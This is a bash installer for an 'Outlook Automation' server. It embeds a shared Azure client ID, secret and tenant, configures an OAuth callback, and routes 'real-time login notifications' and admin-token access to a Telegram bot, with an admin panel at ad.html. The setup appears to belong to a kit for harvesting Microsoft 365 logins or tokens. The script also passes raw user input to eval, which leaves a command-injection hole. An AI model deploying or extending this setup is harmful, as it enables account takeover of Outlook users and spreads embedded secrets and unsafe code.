
#!/bin/bash

# Outlook Automation Installation Script
echo "🚀 Outlook Automation Installation Script"
echo "=========================================="

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo "⚠️  Please don't run this script as root"
    exit 1
fi

# Function to prompt for input
prompt_input() {
    local prompt="$1"
    local default="$2"
    local var_name="$3"
    local is_secret="$4"

    echo -n "$prompt"
    if [ -n "$default" ]; then
        echo -n " (default: $default)"
    fi
    echo -n ": "

    if [ "$is_secret" = "true" ]; then
        read -s input
        echo ""
    else
        read input
    fi

    if [ -z "$input" ] && [ -n "$default" ]; then
        input="$default"
    fi

    eval "$var_name='$input'"
}

echo "📝 Configuring environment variables..."

# Azure Configuration (Required)
echo ""
echo "🔵 Microsoft Azure Configuration"
echo "Pre-configured Azure credentials will be used."
AZURE_CLIENT_ID="34dc06b1-d91e-4408-b353-528722266c04"
AZURE_CLIENT_SECRET="05a49988-1efb-4952-88cc-cb04e9f4c099"
AZURE_TENANT_ID="29775c6a-2d6e-42ef-a6ea-3e0a46793619"
echo "✅ Azure credentials pre-configured"

# Server Configuration
echo ""
echo "🌐 Server Configuration"
prompt_input "Enter your domain/server URL" "https://your-domain.com" "SERVER_URL"
prompt_input "Server port" "5000" "PORT"

# Build Azure redirect URI
AZURE_REDIRECT_URI="${SERVER_URL}/api/auth-callback"

# Telegram Bot Configuration (Optional but recommended)
echo ""
echo "🤖 Telegram Bot Configuration (Recommended)"
echo "The Telegram bot provides:"
echo "  • Real-time login notifications" 
echo "  • Admin token access"
echo "  • Remote admin panel access"
echo ""
prompt_input "Telegram Bot Token (from @BotFather)" "" "TELEGRAM_BOT_TOKEN"

if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
    echo ""
    echo "To get your Chat ID:"
    echo "1. Start a chat with your bot"
    echo "2. Send any message"
    echo "3. Visit: https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates"
    echo "4. Find your chat ID in the response"
    echo ""
    prompt_input "Your Telegram Chat ID" "" "ADMIN_CHAT_IDS"
    
    if [ -z "$ADMIN_CHAT_IDS" ]; then
        echo "⚠️  Warning: Bot configured but no chat ID provided"
        echo "   Admin token will only be available in server logs"
    fi
else
    echo "⚠️  No Telegram bot configured"
    echo "   Admin token will only be available in server logs"
    ADMIN_CHAT_IDS=""
fi

# Create .env file
echo ""
echo "💾 Creating .env file..."
cat > .env << EOF
# Microsoft Azure Configuration
AZURE_CLIENT_ID=$AZURE_CLIENT_ID
AZURE_CLIENT_SECRET=$AZURE_CLIENT_SECRET
AZURE_TENANT_ID=$AZURE_TENANT_ID
AZURE_REDIRECT_URI=$AZURE_REDIRECT_URI

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=$TELEGRAM_BOT_TOKEN
ADMIN_CHAT_IDS=$ADMIN_CHAT_IDS

# Server Configuration  
PORT=$PORT
SERVER_URL=$SERVER_URL
EOF

# Install dependencies
echo ""
echo "📦 Installing dependencies..."
if command -v npm &> /dev/null; then
    npm install
    echo "✅ Dependencies installed!"
else
    echo "❌ npm not found. Please install Node.js first."
    exit 1
fi

echo ""
echo "🎉 Installation complete!"
echo ""
echo "📋 Configuration Summary:"
echo "   • Server URL: $SERVER_URL"
echo "   • Admin Panel: $SERVER_URL/ad.html"
echo "   • Azure Redirect: $AZURE_REDIRECT_URI"

if [ -n "$TELEGRAM_BOT_TOKEN" ]; then
    if [ -n "$ADMIN_CHAT_IDS" ]; then
        echo "   • Telegram Bot: ✅ Configured with notifications"
        echo "   • Admin token accessible via Telegram bot"
    else
        echo "   • Telegram Bot: ⚠️ Configured but no chat ID"
        echo "   • Admin token in server logs only"
    fi
else
    echo "   • Telegram Bot: ❌ Not configured"
    echo "   • Admin token in server logs only"
fi

echo ""
echo "🔧 Important Notes:"
echo "   • Admin token will be auto-generated on first startup"
echo "   • Update your Azure app registration with redirect URI:"
echo "     $AZURE_REDIRECT_URI"

if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$ADMIN_CHAT_IDS" ]; then
    echo "   • Use Telegram bot to get admin token after startup"
else
    echo "   • Check server logs for admin token after startup"
fi

echo ""
echo "🚀 To start: npm start"
echo "🌐 Access: $SERVER_URL"
